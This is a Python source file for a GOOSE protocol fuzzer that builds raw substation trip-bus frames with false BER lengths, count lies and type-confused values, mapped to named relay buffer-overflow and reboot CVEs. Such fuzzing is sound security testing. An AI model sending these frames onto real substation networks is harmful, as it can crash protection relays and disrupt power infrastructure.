"""IEC 61850 GOOSE (Generic Object Oriented Substation Event) Fuzzer

GOOSE is the real-time, publish/subscribe trip/interlock bus of an IEC 61850
substation. It rides directly on Layer 2 (EtherType 0x88B8, multicast dst
01:0c:cd:01:xx:xx) with no TCP/IP transport, and carries a BER-encoded
goosePdu describing dataset values that drive protection relays and breakers.
A subscriber (IED) that trusts attacker-controlled lengths / counts / value
tags in the goosePdu can be pushed into buffer overflows or out-of-range
reboots -- directly on the trip bus.

CVE coverage:
- CVE-2018-18957: stack-based buffer overflow in libiec61850
  prepareGooseBuffer() (CWE-120) -- oversized goosePdu / gocbRef length.
- CVE-2022-22723 / CVE-2022-22725: Schneider Electric GOOSE buffer overflow
  (CWE-120) via crafted GOOSE frames.
- CVE-2023-4518: ABB Relion protection relay reboot on out-of-range GOOSE
  values (malformed allData Data elements).

Framing:
    Ethernet II (dst 01:0c:cd:01:xx:xx, src, EtherType 0x88B8)
      -> GOOSE header (APPID Word, Length Word, Reserved1 Word, Reserved2 Word)
        -> goosePdu (BER tag 0x61):
             gocbRef[0]            octet-string  (0x80)
             timeAllowedToLive[1]  integer       (0x81)
             datSet[2]             octet-string  (0x82)
             goID[3]               octet-string  (0x83)
             t[4]                  utctime  8B    (0x84)
             stNum[5]              integer       (0x85)
             sqNum[6]              integer       (0x86)
             simulation[7]         boolean       (0x87)
             confRev[8]            integer       (0x88)
             ndsCom[9]             boolean       (0x89)
             numDatSetEntries[10]  integer       (0x8a)
             allData[11]           SEQUENCE OF Data (0xab, constructed)

Mirrors the raw-L2 connection model of ethernet.py (ProtocolType.RAW).
"""

import socket
import struct
from typing import List, Optional

from boofuzz import Group, Request, Static

from ..core.base_fuzzer import BaseFuzzer, RequestInfo
from ..core.config import FuzzerConfig, ProtocolType
from ..monitors import BaseMonitor
from ..primitives.asn1 import encode_ber_context_tag, encode_ber_length
from ..primitives.dynamic import SmartBytes


class GOOSEFuzzer(BaseFuzzer):
    """IEC 61850 GOOSE Layer-2 fuzzer for substation trip/interlock bus testing.

    Publishes crafted GOOSE frames (EtherType 0x88B8) that lie about BER
    lengths, dataset-entry counts, and Data-element value tags to probe the
    subscriber-side goosePdu parser (CVE-2018-18957 / CVE-2022-22723 /
    CVE-2023-4518 class bugs).
    """

    GOOSE_ETHERTYPE = 0x88B8

    PROTOCOL_OPTIONS = {
        "interface": {
            "type": str,
            "default": "eth0",
            "description": "Network interface for raw socket operations",
            "example": "eth0",
        },
        "dst_mac": {
            "type": str,
            "default": "01:0c:cd:01:00:01",
            "description": "GOOSE multicast destination MAC (01:0c:cd:01:xx:xx)",
            "example": "01:0c:cd:01:00:01",
        },
        "src_mac": {
            "type": str,
            "default": None,
            "description": "Source MAC address (auto-detect if not set)",
            "example": "aa:bb:cc:dd:ee:ff",
        },
        "goose_appid": {
            "type": int,
            "default": 0x0001,
            "description": "GOOSE APPID (header field, 0x0000-0x3FFF typical)",
            "example": "1000",
        },
        "gocb_ref": {
            "type": str,
            "default": "IEDGENGGIO1/LLN0$GO$gcb01",
            "description": "GOOSE control block reference (gocbRef[0])",
            "example": "IED1/LLN0$GO$gcb01",
        },
    }

    @classmethod
    def get_request_definitions(cls) -> List[RequestInfo]:
        """Static request definitions for --list-requests."""
        return [
            RequestInfo(
                "GOOSE_Baseline",
                "Valid goosePdu with a small allData (connectivity baseline)",
                "baseline",
            ),
            RequestInfo(
                "GOOSE_Length_Overflow",
                "goosePdu/gocbRef BER length > bytes present (CVE-2018-18957 prepareGooseBuffer, CWE-120)",
                "overflow",
            ),
            RequestInfo(
                "GOOSE_NumDatSetEntries_Lie",
                "numDatSetEntries[10] {0x7F,0xFF,0xFFFF} but allData carries few/no entries",
                "malformed",
            ),
            RequestInfo(
                "GOOSE_AllData_TypeConfusion",
                "allData Data elements with mismatched/oversized tags/lengths (CVE-2023-4518 reboot class)",
                "malformed",
            ),
            RequestInfo(
                "GOOSE_Header_Length_Lie",
                "GOOSE header Length field {0x0000,0x0008,0xFFFF} vs actual frame length",
                "boundary",
            ),
            RequestInfo(
                "GOOSE_StNum_SqNum_Boundary",
                "stNum[5]/sqNum[6] over {0, 0x7FFFFFFF, 0xFFFFFFFF}",
                "boundary",
            ),
            RequestInfo(
                "GOOSE_BER_TagLen_Underflow",
                "context tag with length 0 / long-form length-of-length lie inside goosePdu",
                "malformed",
            ),
        ]

    def __init__(self, config: FuzzerConfig = None, connection_factory=None):
        if config:
            config.protocol_type = ProtocolType.RAW
        super().__init__(config, connection_factory)

        self.interface = config.get_option("interface", "eth0") if config else "eth0"
        self.dst_mac = (
            config.get_option("dst_mac", "01:0c:cd:01:00:01") if config else "01:0c:cd:01:00:01"
        )
        self.src_mac = config.get_option("src_mac", None) if config else None
        self.appid = config.get_option("goose_appid", 0x0001) if config else 0x0001
        self.gocb_ref = (
            config.get_option("gocb_ref", "IEDGENGGIO1/LLN0$GO$gcb01")
            if config
            else "IEDGENGGIO1/LLN0$GO$gcb01"
        )

        if not self.src_mac:
            self.src_mac = self._get_interface_mac()

    # ------------------------------------------------------------------
    # Ethernet / MAC helpers (mirrors ethernet.py)
    # ------------------------------------------------------------------
    def _get_interface_mac(self) -> str:
        """Get MAC address of the network interface."""
        try:
            import fcntl

            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            info = fcntl.ioctl(
                s.fileno(), 0x8927, struct.pack("256s", self.interface.encode("utf-8"))
            )
            mac_bytes = info[18:24]
            return ":".join(["%02x" % b for b in mac_bytes])
        except (OSError, ImportError, struct.error) as e:
            self.log.debug(f"Failed to get MAC address for interface '{self.interface}': {e}")
            return "00:11:22:33:44:55"

    def _mac_to_bytes(self, mac_str: str) -> bytes:
        """Convert MAC address string to bytes."""
        return bytes.fromhex(mac_str.replace(":", ""))

    def _eth_header(self) -> bytes:
        """Ethernet II header: dst(6) + src(6) + EtherType 0x88B8."""
        return (
            self._mac_to_bytes(self.dst_mac)
            + self._mac_to_bytes(self.src_mac)
            + struct.pack(">H", self.GOOSE_ETHERTYPE)
        )

    def _goose_header(self, total_length: int, appid: int = None) -> bytes:
        """GOOSE header: APPID Word, Length Word, Reserved1 Word, Reserved2 Word.

        Length covers the GOOSE header (8 bytes) plus the goosePdu.
        """
        appid = self.appid if appid is None else appid
        return (
            struct.pack(">H", appid)  # APPID
            + struct.pack(">H", total_length)  # Length
            + struct.pack(">H", 0x0000)  # Reserved1
            + struct.pack(">H", 0x0000)  # Reserved2
        )

    # ------------------------------------------------------------------
    # BER / goosePdu helpers
    # ------------------------------------------------------------------
    @staticmethod
    def _int_bytes(value: int) -> bytes:
        """Minimal big-endian two's-complement-positive integer content bytes."""
        if value == 0:
            return b"\x00"
        raw = value.to_bytes((value.bit_length() + 7) // 8, "big")
        if raw[0] & 0x80:
            raw = b"\x00" + raw  # keep sign positive
        return raw

    def _data_bool(self, value: bool) -> bytes:
        """GOOSE Data element: boolean[3]."""
        return encode_ber_context_tag(3, b"\xff" if value else b"\x00", False)

    def _data_int(self, value: int) -> bytes:
        """GOOSE Data element: integer[5]."""
        return encode_ber_context_tag(5, self._int_bytes(value), False)

    def _goose_pdu(
        self,
        gocb_ref: str = None,
        time_allowed_to_live: int = 2000,
        dat_set: str = "IEDGENGGIO1/LLN0$GO$ds01",
        go_id: str = "IEDGENGGIO1",
        st_num: int = 1,
        sq_num: int = 0,
        conf_rev: int = 1,
        num_entries: int = 2,
        all_data: bytes = None,
    ) -> bytes:
        """Build a complete BER goosePdu (tag 0x61)."""
        gocb_ref = self.gocb_ref if gocb_ref is None else gocb_ref
        if all_data is None:
            all_data = self._data_bool(False) + self._data_int(0)

        fields = b""
        fields += encode_ber_context_tag(0, gocb_ref.encode("ascii"), False)  # gocbRef[0]
        fields += encode_ber_context_tag(
            1, self._int_bytes(time_allowed_to_live), False
        )  # timeAllowedToLive[1]
        fields += encode_ber_context_tag(2, dat_set.encode("ascii"), False)  # datSet[2]
        fields += encode_ber_context_tag(3, go_id.encode("ascii"), False)  # goID[3]
        fields += encode_ber_context_tag(4, b"\x00" * 8, False)  # t[4] utctime (8 bytes)
        fields += encode_ber_context_tag(5, self._int_bytes(st_num), False)  # stNum[5]
        fields += encode_ber_context_tag(6, self._int_bytes(sq_num), False)  # sqNum[6]
        fields += encode_ber_context_tag(7, b"\x00", False)  # simulation[7]
        fields += encode_ber_context_tag(8, self._int_bytes(conf_rev), False)  # confRev[8]
        fields += encode_ber_context_tag(9, b"\x00", False)  # ndsCom[9]
        fields += encode_ber_context_tag(
            10, self._int_bytes(num_entries), False
        )  # numDatSetEntries[10]
        fields += encode_ber_context_tag(11, all_data, True)  # allData[11]

        return bytes([0x61]) + encode_ber_length(len(fields)) + fields

    # ------------------------------------------------------------------
    # Protocol definition
    # ------------------------------------------------------------------
    def _define_protocol(self):
        """Define GOOSE frame structures and gate every connect() 1:1."""

        # === 1. GOOSE_Baseline (baseline) ============================
        baseline_pdu = self._goose_pdu()
        baseline_frame = (
            self._eth_header() + self._goose_header(8 + len(baseline_pdu)) + baseline_pdu
        )
        goose_baseline = Request(
            "GOOSE_Baseline",
            children=(Static("baseline_frame", baseline_frame),),
        )

        # === 2. GOOSE_Length_Overflow (overflow) =====================
        # goosePdu BER length AND gocbRef octet-string length both claim far
        # more bytes than are actually present -> prepareGooseBuffer() copies
        # attacker-controlled length past the frame (CVE-2018-18957 / CWE-120).
        overflow_rest = (
            encode_ber_context_tag(1, self._int_bytes(2000), False)  # timeAllowedToLive[1]
            + encode_ber_context_tag(2, b"ds", False)  # datSet[2]
            + encode_ber_context_tag(3, b"IED1", False)  # goID[3]
            + encode_ber_context_tag(4, b"\x00" * 8, False)  # t[4]
            + encode_ber_context_tag(5, b"\x01", False)  # stNum[5]
            + encode_ber_context_tag(6, b"\x00", False)  # sqNum[6]
            + encode_ber_context_tag(7, b"\x00", False)  # simulation[7]
            + encode_ber_context_tag(8, b"\x01", False)  # confRev[8]
            + encode_ber_context_tag(9, b"\x00", False)  # ndsCom[9]
            + encode_ber_context_tag(10, b"\x01", False)  # numDatSetEntries[10]
            + encode_ber_context_tag(11, self._data_bool(False), True)  # allData[11]
        )
        goose_length_overflow = Request(
            "GOOSE_Length_Overflow",
            children=(
                Static("eth", self._eth_header()),
                Static("goose_hdr", self._goose_header(0x0040)),
                Static("pdu_tag", b"\x61"),
                # goosePdu BER length larger than the bytes that follow
                Group(
                    "pdu_len",
                    values=[
                        b"\x7f",  # 127 claimed, far fewer present
                        b"\xff",  # 255 (illegal short form) claimed
                        b"\x81\xff",  # long form 255
                        b"\x82\xff\xff",  # long form 65535
                    ],
                ),
                Static("gocbref_tag", b"\x80"),
                # gocbRef octet-string length larger than the 4 bytes present
                Group(
                    "gocbref_len",
                    values=[
                        b"\x7f",  # 127 claimed
                        b"\xff",  # 255 claimed
                        b"\x81\xff",  # long form 255
                    ],
                ),
                # variable field (SmartBytes) -- only 4 bytes actually present
                SmartBytes("gocbref_data", default_value=b"IED1", size=4, fuzzable=True),
                Static("rest", overflow_rest),
            ),
        )

        # === 3. GOOSE_NumDatSetEntries_Lie (malformed) ===============
        # numDatSetEntries[10] claims many entries but allData is empty/short.
        nds_prefix = (
            self._eth_header()
            + self._goose_header(0x0040)
            + bytes([0x61])
            + encode_ber_length(48)  # placeholder pdu length
            + encode_ber_context_tag(0, self.gocb_ref.encode("ascii"), False)
            + encode_ber_context_tag(1, self._int_bytes(2000), False)
            + encode_ber_context_tag(2, b"ds", False)
            + encode_ber_context_tag(3, b"IED1", False)
            + encode_ber_context_tag(4, b"\x00" * 8, False)
            + encode_ber_context_tag(5, b"\x01", False)
            + encode_ber_context_tag(6, b"\x00", False)
            + encode_ber_context_tag(7, b"\x00", False)
            + encode_ber_context_tag(8, b"\x01", False)
            + encode_ber_context_tag(9, b"\x00", False)
        )
        goose_nds_lie = Request(
            "GOOSE_NumDatSetEntries_Lie",
            children=(
                Static("nds_prefix", nds_prefix),
                # numDatSetEntries[10] value lies about the entry count
                Group(
                    "num_entries_lie",
                    values=[
                        b"\x8a\x01\x7f",  # 127 entries claimed
                        b"\x8a\x02\x00\xff",  # 255 entries claimed
                        b"\x8a\x02\xff\xff",  # 65535 entries claimed
                    ],
                ),
                # allData[11] carries NO entries (empty SEQUENCE) -> count-trust
                Static("empty_all_data", encode_ber_context_tag(11, b"", True)),
            ),
        )

        # === 4. GOOSE_AllData_TypeConfusion (malformed) ==============
        # Data elements with mismatched / oversized tags and lengths. An IED
        # that decodes each Data value by trusting its tag/length reads out of
        # range -> CVE-2023-4518 out-of-range reboot class.
        tc_prefix = (
            self._eth_header()
            + self._goose_header(0x0040)
            + bytes([0x61])
            + encode_ber_length(48)
            + encode_ber_context_tag(0, self.gocb_ref.encode("ascii"), False)
            + encode_ber_context_tag(1, self._int_bytes(2000), False)
            + encode_ber_context_tag(2, b"ds", False)
            + encode_ber_context_tag(3, b"IED1", False)
            + encode_ber_context_tag(4, b"\x00" * 8, False)
            + encode_ber_context_tag(5, b"\x01", False)
            + encode_ber_context_tag(6, b"\x00", False)
            + encode_ber_context_tag(7, b"\x00", False)
            + encode_ber_context_tag(8, b"\x01", False)
            + encode_ber_context_tag(9, b"\x00", False)
            + encode_ber_context_tag(10, b"\x01", False)
        )
        goose_typeconfusion = Request(
            "GOOSE_AllData_TypeConfusion",
            children=(
                Static("tc_prefix", tc_prefix),
                # allData[11] (constructed) wrapping a broken Data element
                Group(
                    "bad_all_data",
                    values=[
                        # integer[5] length 0x7F but only 4 bytes present
                        encode_ber_context_tag(11, b"\x85\x7f\x00\x00\x00\x00", True),
                        # boolean[3] length 8 but only 2 bytes present
                        encode_ber_context_tag(11, b"\x83\x08\xff\xff", True),
                        # unknown Data tag 0x91 with out-of-range value
                        encode_ber_context_tag(11, b"\x91\x04\xff\xff\xff\xff", True),
                        # floating-point[7] oversized (NaN/inf pattern) -> reboot
                        encode_ber_context_tag(
                            11, b"\x87\x08\x7f\xff\xff\xff\xff\xff\xff\xff", True
                        ),
                    ],
                ),
            ),
        )

        # === 5. GOOSE_Header_Length_Lie (boundary) ===================
        hl_pdu = self._goose_pdu()
        goose_header_len_lie = Request(
            "GOOSE_Header_Length_Lie",
            children=(
                Static("eth", self._eth_header()),
                Static("appid", struct.pack(">H", self.appid)),
                # GOOSE header Length field vs actual frame length
                Group(
                    "goose_length",
                    values=[
                        struct.pack(">H", 0x0000),  # zero length
                        struct.pack(">H", 0x0008),  # header only (no PDU)
                        struct.pack(">H", 0xFFFF),  # maximum
                    ],
                ),
                Static("reserved", b"\x00\x00\x00\x00"),  # Reserved1 + Reserved2
                Static("pdu", hl_pdu),
            ),
        )

        # === 6. GOOSE_StNum_SqNum_Boundary (boundary) ================
        sn_prefix = (
            self._eth_header()
            + self._goose_header(0x0040)
            + bytes([0x61])
            + encode_ber_length(48)
            + encode_ber_context_tag(0, self.gocb_ref.encode("ascii"), False)
            + encode_ber_context_tag(1, self._int_bytes(2000), False)
            + encode_ber_context_tag(2, b"ds", False)
            + encode_ber_context_tag(3, b"IED1", False)
            + encode_ber_context_tag(4, b"\x00" * 8, False)
        )
        sn_suffix = (
            encode_ber_context_tag(7, b"\x00", False)  # simulation[7]
            + encode_ber_context_tag(8, b"\x01", False)  # confRev[8]
            + encode_ber_context_tag(9, b"\x00", False)  # ndsCom[9]
            + encode_ber_context_tag(10, b"\x01", False)  # numDatSetEntries[10]
            + encode_ber_context_tag(11, self._data_bool(False), True)  # allData[11]
        )
        goose_stnum_sqnum = Request(
            "GOOSE_StNum_SqNum_Boundary",
            children=(
                Static("sn_prefix", sn_prefix),
                # stNum[5] boundary values
                Group(
                    "st_num",
                    values=[
                        b"\x85\x01\x00",  # 0
                        b"\x85\x04\x7f\xff\xff\xff",  # 0x7FFFFFFF
                        b"\x85\x05\x00\xff\xff\xff\xff",  # 0xFFFFFFFF (positive)
                    ],
                ),
                # sqNum[6] boundary values
                Group(
                    "sq_num",
                    values=[
                        b"\x86\x01\x00",  # 0
                        b"\x86\x04\x7f\xff\xff\xff",  # 0x7FFFFFFF
                        b"\x86\x05\x00\xff\xff\xff\xff",  # 0xFFFFFFFF (positive)
                    ],
                ),
                Static("sn_suffix", sn_suffix),
            ),
        )

        # === 7. GOOSE_BER_TagLen_Underflow (malformed) ===============
        # A context tag inside the goosePdu with length 0 or a long-form
        # length-of-length lie -> BER decoder under/over-reads.
        underflow_head = self._eth_header() + self._goose_header(0x0020) + bytes([0x61])
        goose_taglen_underflow = Request(
            "GOOSE_BER_TagLen_Underflow",
            children=(
                Static("underflow_head", underflow_head),
                Static("pdu_len", b"\x20"),
                # broken leading context field (tag + malformed length)
                Group(
                    "bad_tag_len",
                    values=[
                        b"\x80\x00",  # gocbRef[0] length 0
                        b"\x81\x00",  # timeAllowedToLive[1] length 0
                        b"\x85\x81",  # long-form flagged but length byte missing
                        b"\x86\x84\xff\xff\xff\xff",  # 4-byte length-of-length lie
                        b"\x80\x84\x00\x00\x00\x00",  # length-of-length resolving to 0
                    ],
                ),
                # trailing bytes so there is a body to (mis)read
                Static("tail", b"\x00\x00\x00\x00"),
            ),
        )

        # ------------------------------------------------------------------
        # STRICT 1:1 gating -- one is_request_enabled() per connect()
        # ------------------------------------------------------------------
        if self.is_request_enabled("GOOSE_Baseline"):
            self.session.connect(goose_baseline)

        if self.is_request_enabled("GOOSE_Length_Overflow"):
            self.session.connect(goose_length_overflow)

        if self.is_request_enabled("GOOSE_NumDatSetEntries_Lie"):
            self.session.connect(goose_nds_lie)

        if self.is_request_enabled("GOOSE_AllData_TypeConfusion"):
            self.session.connect(goose_typeconfusion)

        if self.is_request_enabled("GOOSE_Header_Length_Lie"):
            self.session.connect(goose_header_len_lie)

        if self.is_request_enabled("GOOSE_StNum_SqNum_Boundary"):
            self.session.connect(goose_stnum_sqnum)

        if self.is_request_enabled("GOOSE_BER_TagLen_Underflow"):
            self.session.connect(goose_taglen_underflow)

    def _get_monitors(self) -> List[BaseMonitor]:
        """Raw L2 GOOSE has no traditional request/response monitor."""
        return []

    def setup_custom_monitors(self) -> Optional[List[BaseMonitor]]:
        """Setup GOOSE-specific monitors."""
        return self._get_monitors()
